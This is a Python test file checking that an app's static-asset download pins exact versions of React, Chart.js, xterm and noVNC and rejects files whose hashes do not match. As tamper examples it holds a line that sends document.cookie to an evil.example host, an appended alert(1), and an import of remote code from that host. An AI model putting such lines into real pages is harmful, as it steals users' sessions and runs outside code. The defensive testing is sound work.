"""--download-static keeps only what hashes to the pinned release.

The command fetched react@18, react-dom@18, @babel/standalone@7 and chart.js@4 (a major
version each, so whatever the CDN served that day) and the 45 noVNC modules, and wrote
them into static/ without looking at them; the app then ran them as its own code. Every
file is fetched at an exact version now and written only when it matches: the libraries
the hash of the copy this repository ships (for most of them the SRI hash of
web/index.html too), noVNC one digest over the whole set, before the import rewrite.
Nothing touches the network here: urlopen is replaced.
NS Oct 2026
"""
import base64
import hashlib
import io
import os
import re
import urllib.request

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LIBS = {
    'react.production.min.js': 'js', 'react-dom.production.min.js': 'js', 'babel.min.js': 'js',
    'chart.umd.min.js': 'js', 'xterm.min.js': 'js', 'xterm-addon-fit.min.js': 'js', 'xterm.min.css': 'css',
}


def _shipped(subdir, name):
    with open(os.path.join(ROOT, 'static', subdir, name), 'rb') as fh:
        return fh.read()


def _sri(data):
    return 'sha384-' + base64.b64encode(hashlib.sha384(data).digest()).decode()


class _Resp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


@pytest.fixture
def cdn(tmp_path, monkeypatch):
    """A CDN in a dict: url -> bytes. What is not in it fails like an unreachable host."""
    served, asked = {}, []

    def urlopen(req, timeout=None, context=None):
        url = req.full_url if hasattr(req, 'full_url') else req
        asked.append(url)
        if url not in served:
            raise OSError('unreachable in this test')
        return _Resp(served[url])

    monkeypatch.setattr(urllib.request, 'urlopen', urlopen)
    monkeypatch.chdir(tmp_path)
    (tmp_path / 'static' / 'css').mkdir(parents=True)
    (tmp_path / 'static' / 'css' / 'tailwind.min.css').write_text('/* build */')
    return served, asked, tmp_path


def _lib_urls():
    from pegaprox import app as app_mod
    import inspect
    src = inspect.getsource(app_mod.download_static_files)
    return dict(re.findall(r"\('([\w.-]+\.(?:js|css))', '(https://[^']+)'", src))


def _run():
    from pegaprox.app import download_static_files
    return download_static_files()


def test_every_library_url_names_an_exact_version():
    urls = _lib_urls()
    assert set(urls) == set(LIBS), urls
    for name, url in urls.items():
        assert re.search(r'@\d+\.\d+\.\d+/', url), (name, url)


def test_the_pins_are_the_files_the_repository_ships():
    """The download reproduces static/ byte for byte, so a git checkout stays clean."""
    import pegaprox.app as app_mod
    import inspect
    src = inspect.getsource(app_mod.download_static_files)
    pins = dict(re.findall(r"\('([\w.-]+\.(?:js|css))', 'https://[^']+',\s*'(sha384-[^']+)'\)", src))
    assert set(pins) == set(LIBS), pins
    for name, sub in LIBS.items():
        assert pins[name] == _sri(_shipped(sub, name)), name
    # and where web/index.html loads the same file from the CDN, the same hash
    index = open(os.path.join(ROOT, 'web', 'index.html'), encoding='utf-8').read()
    for key, name in (('react@18.3.1', 'react.production.min.js'), ('react-dom@18.3.1', 'react-dom.production.min.js'),
                      ('chart.js@4.5.1', 'chart.umd.min.js'), ('xterm@5.3.0', 'xterm.min.js'),
                      ('xterm-addon-fit@0.8.0', 'xterm-addon-fit.min.js')):
        assert f"'{key}': '{pins[name]}'" in index, key


def test_a_tampered_library_is_not_written(cdn):
    served, asked, tmp = cdn
    urls = _lib_urls()
    for name, sub in LIBS.items():
        served[urls[name]] = _shipped(sub, name)
    served[urls['react.production.min.js']] = b'/* React */ fetch("https://evil.example/" + document.cookie);'
    assert _run() is False
    assert not (tmp / 'static' / 'js' / 'react.production.min.js').exists()
    # the genuine ones around it are written as served
    assert (tmp / 'static' / 'js' / 'chart.umd.min.js').read_bytes() == _shipped('js', 'chart.umd.min.js')
    assert (tmp / 'static' / 'css' / 'xterm.min.css').read_bytes() == _shipped('css', 'xterm.min.css')


def test_a_file_already_there_survives_a_tampered_download(cdn):
    served, asked, tmp = cdn
    urls = _lib_urls()
    keep = tmp / 'static' / 'js' / 'chart.umd.min.js'
    keep.parent.mkdir(parents=True, exist_ok=True)
    keep.write_bytes(_shipped('js', 'chart.umd.min.js'))
    served[urls['chart.umd.min.js']] = _shipped('js', 'chart.umd.min.js') + b'\n;alert(1)'
    _run()
    assert keep.read_bytes() == _shipped('js', 'chart.umd.min.js')


def test_the_genuine_libraries_are_all_written(cdn):
    served, asked, tmp = cdn
    urls = _lib_urls()
    for name, sub in LIBS.items():
        served[urls[name]] = _shipped(sub, name)
    _run()
    for name, sub in LIBS.items():
        assert (tmp / 'static' / sub / name).read_bytes() == _shipped(sub, name), name


NOVNC_BASE = 'https://cdn.jsdelivr.net/npm/@novnc/novnc@1.4.0/'


def _novnc_files():
    import inspect
    import pegaprox.app as app_mod
    src = inspect.getsource(app_mod.download_static_files)
    block = src[src.index('novnc_files = ['):src.index(']', src.index('novnc_files = ['))]
    return re.findall(r"'([\w/]+\.js)'", block)


def _novnc_set():
    """Stand-in modules: each imports the one before it, relatively, the way noVNC does."""
    files = _novnc_files()
    assert len(files) == 45
    out = {}
    for i, fp in enumerate(files):
        prev = files[i - 1].rsplit('/', 1)[-1] if i else None
        body = f"// {fp}\n" + (f"import x from './{prev}';\n" if prev else '') + 'export default 1;\n'
        out[fp] = body.encode()
    return out


def _digest(files_in_order, content):
    return _sri(b''.join(fp.encode() + b'\0' + content.get(fp, b'') + b'\0' for fp in files_in_order))


def test_novnc_is_written_only_as_the_pinned_set(cdn, monkeypatch):
    served, asked, tmp = cdn
    import pegaprox.app as app_mod
    content = _novnc_set()
    monkeypatch.setattr(app_mod, '_NOVNC_SHA384', _digest(_novnc_files(), content))
    for fp, body in content.items():
        served[NOVNC_BASE + fp] = body
    served[NOVNC_BASE + 'core/rfb.js'] = b"import evil from 'https://evil.example/x.js';\nexport default 1;\n"
    _run()
    written = [p for p in (tmp / 'static' / 'js' / 'novnc').rglob('*.js') if p.name != 'rfb.min.js']
    assert written == [], written


def test_the_pinned_novnc_set_is_written_with_its_imports_rewritten(cdn, monkeypatch):
    served, asked, tmp = cdn
    import pegaprox.app as app_mod
    content = _novnc_set()
    monkeypatch.setattr(app_mod, '_NOVNC_SHA384', _digest(_novnc_files(), content))
    for fp, body in content.items():
        served[NOVNC_BASE + fp] = body
    _run()
    files = _novnc_files()
    for fp in files:
        assert (tmp / 'static' / 'js' / 'novnc' / fp).exists(), fp
    second = (tmp / 'static' / 'js' / 'novnc' / files[1]).read_text()
    assert f"from '/static/js/novnc/core/{files[0].rsplit('/', 1)[-1]}'" in second, second


def _unrewrite(fp, text):
    """The release file back from a shipped one: absolute imports made relative again."""
    import posixpath
    here = posixpath.dirname(fp) or '.'

    def back(m):
        rel = posixpath.relpath(m.group(2)[len('/static/js/novnc/'):], here)
        return f"from {m.group(1)}{rel if rel.startswith('../') else './' + rel}{m.group(1)}"
    return re.sub(r'''from\s+(['"])(/static/js/novnc/[^'"]+)\1''', back, text)


def test_the_novnc_digest_is_the_release_the_repository_ships():
    """static/js/novnc is noVNC 1.4.0 with its imports rewritten. Undone, it hashes to the pin."""
    import pegaprox.app as app_mod
    files = _novnc_files()
    content = {}
    for fp in files:
        with open(os.path.join(ROOT, 'static', 'js', 'novnc', fp), encoding='utf-8') as fh:
            content[fp] = _unrewrite(fp, fh.read()).encode('utf-8')
    assert _digest(files, content) == app_mod._NOVNC_SHA384
